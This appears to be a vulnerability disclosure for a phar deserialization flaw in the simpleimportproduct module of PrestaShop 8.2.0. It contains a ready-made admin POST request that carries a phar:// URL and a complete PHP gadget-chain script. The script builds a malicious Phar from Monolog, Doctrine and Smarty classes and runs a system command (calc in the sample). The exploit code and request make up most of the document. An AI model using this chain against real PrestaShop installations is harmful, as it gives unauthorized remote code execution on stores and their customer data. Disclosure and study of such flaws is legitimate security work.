# `phar` deserialization vulnerability `AdminProductsimportController.php#_getHeaders` function

## 0x01 Affected version
vendor: https://github.com/PrestaShop/PrestaShop
version: 8.2.0
php version: 7.x
module: simpleimportproduct
## 0x02 Vulnerability description
In PHP, the `Phar file format` is an archive format used to package and distribute PHP applications. This format allows multiple files, directories, and metadata to be bundled into a single file. However, the Phar format contains a deserialization vulnerability that allows an attacker to trigger the deserialization vulnerability by crafting a malicious Phar file. This vulnerability typically occurs when deserializing user input without filtering, allowing the attacker to control the contents of the deserialized object and execute arbitrary code.

Specifically, an attacker can exploit this vulnerability by creating a malicious Phar file and uploading it to a vulnerable PHP server. By triggering the `phar://` protocol, the attacker can read and deserialize the data from the file. The deserialization process can lead to the execution of arbitrary PHP code, allowing the attacker to remotely execute code, retrieve sensitive information, or perform other malicious actions.

The severity of this vulnerability lies in its ability to allow unauthorized remote code execution, enabling an attacker to fully compromise the system, further manipulate the server, or steal sensitive data.

In `PrestaShop v8.2.0`, within the `AdminProductsimportController.php#_getHeaders` function, the `get_headers` method is used. When `$file_url='phar://**'`, remote attackers can achieve remote code execution.The fopen function is a key method that triggers the Phar deserialization vulnerability.

The call stack
```
1. AdminProductsimportController#ajaxProcessLoadFile
2. AdminProductsimportController#_getHeaders
3. get_headers
```
ajaxProcessLoadFile()
```php
public function ajaxProcessLoadFile(){
    try{
      if( !Tools::getValue('import_settings_name') ){
        throw new Exception( Module::getInstanceByName('simpleimportproduct')->l('Please enter Settings Name!') );
      }

      if( Tools::getValue('feed_source') == 'file_url' ){
        $this->_getHeaders();
      }

    }
}
```
_getHeaders()
```php
    if( Tools::getValue('zip_file') ){
    }
    else{
      $file = Tools::getValue('file_url');
      $remoteHeaders = get_headers($file);
    }
```

post_data
> after login,just replace the {ip} and {file_url}
```
http://{ip}/admin/index.php 
POSTï¼šajax=true&token=30bab4ff1c14f8da75f9dc9128ce4ef5&controller=AdminProductsimport&action=loadFile&id_shop=1&id_lang=1&id_shop_group=1&format_file=xlsx&delimiter_val=%3B&import_type_val=Add%2Fupdate&parser_import_val=name&supplier_to_update=&combination_identification=0&use_headers=1&zip_file=0&disable_hooks=1&search_index=1&products_range=all&from_range=1&to_range=10&force_ids=0&iteration=100&file_url={phar://***}&feed_source=file_url&file_import_ftp_server=&file_import_ftp_user=&file_import_ftp_password=&file_import_ftp_port=21&file_import_ftp_port_ssl=22&passive_mode=0&remove_ftp_file=0&file_import_ftp_file_path=&import_settings_name=aaa&setting_id=
```

The following code can be used to generate a malicious Phar file.

```php
<?php
namespace Monolog\Handler{
    interface HandlerInterface
    {}
    interface ResettableInterface
    {
    }
    abstract class AbstractHandler implements HandlerInterface, ResettableInterface
    {
        protected $level = 1;
        protected $bubble = true;
        protected $formatter;
        protected $processors = array();
    }
    class FingersCrossedHandler extends AbstractHandler {
        protected $handler;
        protected $activationStrategy;
        protected $buffering = true;
        protected $bufferSize;
        protected $buffer = array();
        protected $stopBuffering;
        protected $passthruLevel;

        public function __construct($handler){
            $this->passthruLevel = 0;
            $this->buffer = array(
                "a"=>array(
                    "level"=>100
                )
            );
            $this->handler = $handler;
            // $this->handler =
        }
    }
}


namespace Doctrine\ORM\Mapping{
    interface ClassMetadata{}
    class ClassMetadataInfo implements ClassMetadata
    {
        public const INHERITANCE_TYPE_NONE = 1;
        public const INHERITANCE_TYPE_JOINED = 2;
        public const INHERITANCE_TYPE_SINGLE_TABLE = 3;
        public const INHERITANCE_TYPE_TABLE_PER_CLASS = 4;
        public const GENERATOR_TYPE_AUTO = 1;
        public const GENERATOR_TYPE_SEQUENCE = 2;
        public const GENERATOR_TYPE_TABLE = 3;
        public const GENERATOR_TYPE_IDENTITY = 4;
        public const GENERATOR_TYPE_NONE = 5;
        public const GENERATOR_TYPE_UUID = 6;
        public const GENERATOR_TYPE_CUSTOM = 7;
        public const CHANGETRACKING_DEFERRED_IMPLICIT = 1;
        public const CHANGETRACKING_DEFERRED_EXPLICIT = 2;
        public const CHANGETRACKING_NOTIFY = 3;
        public const FETCH_LAZY = 2;
        public const FETCH_EAGER = 3;
        public const FETCH_EXTRA_LAZY = 4;
        public const ONE_TO_ONE = 1;
        public const MANY_TO_ONE = 2;
        public const ONE_TO_MANY = 4;
        public const MANY_TO_MANY = 8;
        public const TO_ONE = 3;
        public const TO_MANY = 12;
        public const CACHE_USAGE_READ_ONLY = 1;
        public const CACHE_USAGE_NONSTRICT_READ_WRITE = 2;
        public const CACHE_USAGE_READ_WRITE = 3;
        public const GENERATED_NEVER = 0;
        public const GENERATED_INSERT = 1;
        public const GENERATED_ALWAYS = 2;
        public $name;
        public $namespace;
        public $rootEntityName;
        public $customGeneratorDefinition;
        public $customRepositoryClassName;
        public $isMappedSuperclass = false;
        public $isEmbeddedClass = false;
        public $parentClasses = [];
        public $subClasses = [];
        public $embeddedClasses = [];
        public $namedQueries = [];
        public $namedNativeQueries = [];
        public $sqlResultSetMappings = [];
        public $identifier = [];
        public $inheritanceType = self::INHERITANCE_TYPE_NONE;
        public $generatorType = self::GENERATOR_TYPE_NONE;
        public $fieldMappings = [];
        public $fieldNames = [];
        public $columnNames = [];
        public $discriminatorValue;
        public $discriminatorMap = [];
        public $discriminatorColumn;
        public $table;
        public $lifecycleCallbacks = [];
        public $entityListeners = [];
        public $associationMappings = [];
        public $isIdentifierComposite = false;
        public $containsForeignIdentifier = false;
        public $containsEnumIdentifier = false;
        public $idGenerator;
        public $sequenceGeneratorDefinition;
        public $tableGeneratorDefinition;
        public $changeTrackingPolicy = self::CHANGETRACKING_DEFERRED_IMPLICIT;
        public $requiresFetchAfterChange = false;
        public $isVersioned = false;
        public $versionField;
        public $cache;
        public $reflClass;
        public $isReadOnly = false;
        protected $namingStrategy;
        public $reflFields = [];
        private $instantiator;
        public function __construct($handler,$code){
            $this->instantiator = $handler;
            $this->name = $code;
        }
    }
}
namespace {
	ini_set("display_errors", "On");
	ini_set("error_reporting",E_ALL);
    class SmartyLazyRegister
    {
        protected $registry = [];
        protected static $instances = [];
        public function __construct($func){
            $this->registry["instantiate"] = $func;

        }
    }
    $func = "system";
    $code = "calc";
    $lazy = new SmartyLazyRegister($func);
    $meatinfo = new Doctrine\ORM\Mapping\ClassMetadataInfo($lazy,$code);
    $handler = array($meatinfo,"newInstance");

    $FingersCrossedHandler = new Monolog\Handler\FingersCrossedHandler($handler);
    $phar = new Phar("exp.phar"); 
    $phar->startBuffering();
    $phar->setStub('<?php __HALT_COMPILER(); ?>'); 
    $phar->setMetadata($FingersCrossedHandler);
    $phar->addFromString("exp.txt", "test"); 
    $phar->stopBuffering();

    echo base64_encode(serialize($FingersCrossedHandler));
}
```





